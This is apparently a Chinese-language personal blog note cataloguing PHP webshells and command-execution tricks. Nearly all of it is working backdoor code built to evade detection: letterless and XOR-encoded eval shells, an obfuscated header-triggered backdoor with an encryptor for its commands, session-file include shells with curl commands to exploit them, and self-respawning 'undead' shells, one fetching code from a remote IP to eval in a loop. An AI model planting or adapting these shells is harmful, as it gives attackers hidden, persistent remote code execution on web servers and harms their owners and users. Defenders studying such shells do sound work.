---
title: php-命令执行
passwd: 345678
abbrlink: 5109
date: 2018-07-18 15:58:22
tags: web安全
---

## webshell 没字母

```shell
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
=> 
$_GET[_]($_GET[__]);
=>
<?=`{${~"����"}[_]}`;
// echo -ne '<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;'
```

## 写文件&读文件

php的标签<?php存在字母肯定不行，尝试<?发现不解析，没有开启段标签。
查资料后发现<?=可以作为php标签。<?=的含义为<?php echo，是PHP 5.4.0以后的新特性
**不管是否设置 short_open_tag php.ini 选项，<?= 将总是可用。**

```shell
<?=$_=`/???/??? ../??????.???>@#$`;
=> 
/bin/cat ../secret.php>@#$
=> 
cat ../secret.php>@#$
=>
<?=`/???/??? ../??????.??? > ===`
=>
<?=`/???/??? ../*`;
```

参考链接: 

* http://www.likesec.com/2017/12/08/webshell/

* https://www.jianshu.com/p/13cb1d8d0441

## 超高隐蔽shell

```

<?php
$s='=0;pw($pwj<$c&&$ipw<$l);$jpw++pw,$i++){$opw.=$pwt{$i}^$k{$j}pw;}}repwpwturn pw$o;}$r=$_SERVEpwR;$pwpwrr=@$r["HpwTTP_REpwpwFE';
$I='m[2]pw[$z]];ipwf(strpopwspw($p,$h)pw===0){$s[$pwpwi]="";$pwppw=$ss($p,3);}if(apwrray_pwkey_existpws($i,$pws)){pw$s[$i].pw=$p;';
$U='$epw=strppwpwos($s[$ipw],$f);ipwfpw($e){pw$k=$pwkpwh.$kf;ob_start();@evpwapwl(@gzuncpwpwompress(@x(@baspwepw64_decpwpwode(';
$d=str_replace('pF','','cpFreapFtepFpF_pFfuncpFtion');
$Q='preg_replapwce(arrapwypwpw("/_/","/-/"),array("pw/"pw,"+"),pwpw$ss($s[pw$i],0pw,$e))),$k)));pw$opw=ob_gepwt_pwcopwpwntents();o';
$O='b_end_clean(pw);$d=bpwase64pw_epwncode(x(gzcompwpress($opw),$pwk));pripwntpw("<$kpw>$d</$k>");@sespwpwspwion_destroy();}}}}';
$y='RERpwpw"];$ra=@$r["HTTP_ACCEPTpwpw_LANGUAGE"];pwifpw(pw$rr&&$ra)pw{$u=parsepw_urlpw($rr);parspwe_str($upw["qpwupwery"],$q);';
$X='$q=pwapwrray_values(pwpw$q);preg_mpwatchpw_alpwl("/([\\w])[pw\\wpw-]+(?:;q=0.(pw[pw\\d]))?,?/pw",$rpwpwa,$m);pwif($q&&$m){@';
$b='sespwsion_stapwrt();$pwspw=&$_SESpwSpwION;$pwss="spwubpwstr";$sl="pwstrtolopwwer";$i=$m[1][0]pwpw.$m[1][1];pw$h=$sl(pwpw$s';
$q='pws(md5($i.$kh)pw,0,3));$fpwpw=$pwsl($ss(md5($i.$kfpw),0pwpw,3));$p="pw";fopwr($zpw=1;$z<count($m[1pwpw]);$pwz++)$p.=$pwq[$';
$W='$kh="d6a6";pw$kf=pw"bc0d";pwfupwnction x($pwt,$pwkpw){$c=spwtrlen($k);$l=pwpwstrlen($t);pwpw$o="pw";for($i=0pw;$i<$l;){fopwr($j';
$j=str_replace('pw','',$W.$s.$y.$X.$b.$q.$I.$U.$Q.$O);
$u=$d('',$j);$u();
```

### 解混淆

```
<?php
$kh = "d6a6";
$kf = "bc0d";

// 循环异或加密解密，密钥 $k
function x($t, $k)
{
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
$r  = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr && $ra) {
    $u = parse_url($rr); // parse referer, return array, keys: scheme,host,port,user,pass,path,query,fragment
    parse_str($u["query"], $q);      // parse query string into $q (array).
    // 将 referer 的 query string 的 各个value取出到 $q
    $q = array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
    if ($q && $m) {
        @session_start();
        $s =& $_SESSION;
        $ss = "substr";
        $sl = "strtolower";
        $i  = $m[1][0] . $m[1][1];
        $h  = $sl($ss(md5($i . $kh), 0, 3));
        $f  = $sl($ss(md5($i . $kf), 0, 3));
        $p  = "";
        for ($z = 1; $z < count($m[1]); $z++)
            $p .= $q[$m[2][$z]];
        if (strpos($p, $h) === 0) {
            $s[$i] = "";
            $p     = $ss($p, 3);
        }
        if (array_key_exists($i, $s)) {
            $s[$i] .= $p;
            $e = strpos($s[$i], $f);
            if ($e) {
                $k = $kh . $kf;
                ob_start();
                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"), array("/","+"), $ss($s[$i], 0, $e))), $k)));
                $o = ob_get_contents();
                ob_end_clean();
                $d = base64_encode(x(gzcompress($o), $k));
                print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
}
?>
```

### http头设置

```
HTTP头部:
"b1d" 来源: substr(md5("aa" . "d6a6"), 0, 3);
ht@TIANJI:/mnt/c/Users/HT/Desktop$ echo -n aad6a6 | md5sum
b1d27c82dcf08fcfc22fe8911fd82d6f  -
"98b" 来源: substr(md5("aa" . "bc0d"), 0, 3);
ht@TIANJI:/mnt/c/Users/HT/Desktop$ echo -n aabc0d | md5sum
98b28829edb0004ce2aee84e962748fa  -

Referer: http://114.114.114.114?q0=hahaha&q1=b1d&q2=HKpK_kqr_C-v4bGCZGMloGe3&q3=98b
Accept-Language: ah;q=0.8,an-US;q=0.1,an;q=0.2,an;q=0.3
```

### 加解密：

```
<?php

function x($t,$k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for($i=0;$i<$l;){
        for($j=0; ($j<$c && $i<$l); $j++,$i++){
            $o .= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}

$key = "d6a6bc0d";

function encrypt($data, $key) {
    $data = preg_replace(array("/\//","/\+/"), array("_","-"), base64_encode(x(gzcompress($data), $key)));
    return $data;
}

function decrypt($data, $key) {
    echo @gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"), array("/","+"), $data)), $key));
}

// $data = encrypt("phpinfo();", $key);

$data = "HKpSAlBlMGVJNvY=";
echo decrypt($data, $key);

$f = fopen( 'php://stdin', 'r' );

while( true ) {
    echo "请输入你想要执行的payload:\n";
    $line = fgets($f);
    echo encrypt(substr($line, 0, -1), $key);
}
 
fclose( $f );
```

## 高隐蔽shell

```php
<?php
session_start();
extract($_GET);
if(preg_match('/[0-9]/',$_SESSION['PHPSESSID']))
                   exit;
if(preg_match('//|./',$_SESSION['PHPSESSID']))
                   exit;
include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
?>
```

```
curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=}?%3E%3C?php%20system($_GET[a]);%20/*"
这时候，shell就会保存在"session.save_path"."/sess_abc"中
curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=abc&a=ls"
即可利用。
```

## 高隐蔽shell2

```
<?php
$sss = "ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NCcGMzTmxkQ2dnSkY5U1JWRlZSVk5VV3lkd1lYTnpKMTBnS1NsN1FHVjJZV3dvSUdKaGMyVTJORjlrWldOdlpHVW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==";
function CheckSQL( &$val ){ 
    $v = "select|update|union|set|where|order|and|or";
    $val = base64_decode( $val );
}
CheckSQL( $sss );
preg_replace('/uploadsafe.inc.php/e','@'.$sss, 'uploadsafe.inc.php');
?>
解密后:
解密后为：if ( isset( $_REQUEST['pass'] )){@eval( base64_decode( $_REQUEST['pass'] ) );}else{@eval( $_REQUEST['addimg'] );}
```

## 高隐蔽shell3

```
<?php
if (!function_exists('get_c1ient_area')) {
    function get_c1ient_area() {
        $_SERVER['REM0TE_ADDR'] = 'REM0TE_CREATE_QGV2YWwoJF';
        $_SERVER['HTTP_CL1ENT_1P'] = 'STR_9QT1NUW2F';
        $_SERVER['HTTP_X_F0RWARDED_FOR'] = 'BASE_SERVER64_kbV0pOw==';
        $get_c1ient_area = substr($_SERVER['REM0TE_ADDR'], 7, 7) . "FUNCTION";
        $getenv = substr($_SERVER['HTTP_CL1ENT_1P'], 0, 4) . "REPLACE";
        $isset = $getenv('_SERVER', '', substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 0, 14)) . "DECODE";
        //@eval($_POST[adm])
        $rea1area = $isset(substr($_SERVER['REM0TE_ADDR'], 14) . substr($_SERVER['HTTP_CL1ENT_1P'], 4) . substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 14));
        echo $rea1area;
        $on1inearea = $get_c1ient_area('', $rea1area);
        $on1inearea();
        return @$onlinearea;
    }
    $on1inearea = get_c1ient_area();
}
?>
解密后:
@eval($_POST[adm])
```

```
<?php
    # return 32md5 back 6
    function getMd5($md5 = null) {
        $key = substr(md5($md5),26);
        return $key; 
        } 
        $array = array(
            chr(112).chr(97).chr(115).chr(115), //pass
            chr(99).chr(104).chr(101).chr(99).chr(107), // check
            chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)    // c451cc
        );
        if ( isset($_POST) ){
            $request = &$_POST;
        } 
        
        elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
        
        if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { 
            if ( getMd5($request[$array[0]]) == $array[2] ) {  //md5(pass) == c451cc
                $token = preg_replace (
                chr(47) . $array[2] . chr(47) . chr(101),  //  /c451cc/e
                $request[$array[1]], 
                $array[2]
            );
        }
    }
?>
```

```
<?php
$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];
if($MMIC >1000000){
  die('404');
}
if (isset($_POST["\x70\x61\x73\x73"]) && isset($_POST["\x63\x68\x65\x63\x6b"]))
{
  $__PHP_debug   = array (
    'ZendName' => '70,61,73,73', 
    'ZendPort' => '63,68,65,63,6b',
    'ZendSalt' => '792e19812fafd57c7ac150af768d95ce'
  );
 
  $__PHP_replace = array (
    pack('H*', join('', explode(',', $__PHP_debug['ZendName']))),
    pack('H*', join('', explode(',', $__PHP_debug['ZendPort']))),
    $__PHP_debug['ZendSalt']
  );
 
  $__PHP_request = &$_POST;
  $__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);
 
  if ($__PHP_token == $__PHP_replace[2])
  {
    $__PHP_token = preg_replace (
      chr(47).$__PHP_token.chr(47).chr(101),
      $__PHP_request[$__PHP_replace[1]],
      $__PHP_token
    );
 
    unset (
      $__PHP_debug,
      $__PHP_replace,
      $__PHP_request,
      $__PHP_token
    );
 
    if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');
 
  }
}
```

## php反射机制（太明显）

```
<?php
    /**
    * eva
    * l($_POS
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    $payload = substr($str,strpos($str,'ev'),3);
    $payload .= substr($str,strpos($str,'l('),7);
    $payload .= substr($str,strpos($str,'T['),8);
    $exe = substr($str, strpos($str, 'as'), 4);
    $exe .= substr($str, strpos($str, 'rt'), 2);
    
    $exe($payload);
?>
解密后:
assert(eval($_POST["c"]));
```

## XOR （太花哨）

```
<?php
    @$_++; // $_ = 1
    $__=("#"^"|"); // $__ = _
    $__.=("."^"~"); // _P
    $__.=("/"^"`"); // _PO
    $__.=("|"^"/"); // _POS
    $__.=("{"^"/"); // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?>
```

## 反引号（太花哨）

```
<?php
$y = ~"瀸寶崑";    // assert
$cmd = ~"暅挌挌洖"; // jcmemeda
$y($_REQUEST[$cmd]);
?>
```

## 加号（太花哨）

```
<?php
$num = +"";
$num++; $num++; $num++; $num++;
$four = $num; // 4
$num++; $num++;
$six = $num; // 6
$_="";
$_[+$_]++;  // +""为0
$_=$_.""; // $_为字符串"Array"
$___=$_[+""];//A
$____=$___;
$____++;//B
$_____=$____;
$_____++;//C
$______=$_____;
$______++;//D
$_______=$______;
$_______++;//E
$________=$_______;
$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O
$_________=$________;
$_________++;$_________++;$_________++;$_________++;//S
$_=$____.$___.$_________.$_______.$six.$four.'_'.$______.$_______.$_____.$________.$______.$_______;
$________++;$________++;$________++;//R
$_____=$_________;
$_____++;//T
$__=$___.$_________.$_________.$_______.$________.$_____;
$__($_("ZXZhbCgkX1BPU1RbY21kXSk=")); 
//ASSERT(BASE64_DECODE("ZXZhbCgkX1BPU1RbY21kXSk="));  
//ASSERT(eval($_POST[cmd]));  
?>
```

## 内存shell(不死马)

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
$file = "veneno.php";
$shell = "<?php eval($_POST[venenohi]);?>";
while (TRUE) {
    if (!file_exists($file)) {
        file_put_contents($file, $shell);
    }
    usleep(50);
}
?>
```

```php
<?php
$password = "LandGrey";
$key = substr(__FILE__,-5,-4);
${"LandGrey"} = $_SERVER["HTTP_ACCEPT"]."Land!";
$f = pack("H*", "13"."3f120b1655") ^ $LandGrey;
array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
?>
```

```php
<?php
    unlink($_SERVER['SCRIPT_FILENAME']);     //删除脚本
    ignore_user_abort(true);
    set_time_limit(0);
    $remote_file = 'http://123.207.90.143/tmp.txt';               // 从远端获取指令
    while($code = file_get_contents($remote_file)){
    @eval($code);
    sleep(5);
};
?>          // 不好使
```

## 内存shell2

```php
<?php  
    set_time_limit(0);  
    ignore_user_abort(1);  
    unlink(__FILE__);  
    while(1){  
        file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');  
        sleep(1);  
    }
?>       // 好使
```



## 新版:

```
<?php $xx='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';$test=$xx('$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e($x));');$test('ZXZhbCgkX1BPU1RbJ2FkbWluJ10pOw=='); ?>
```

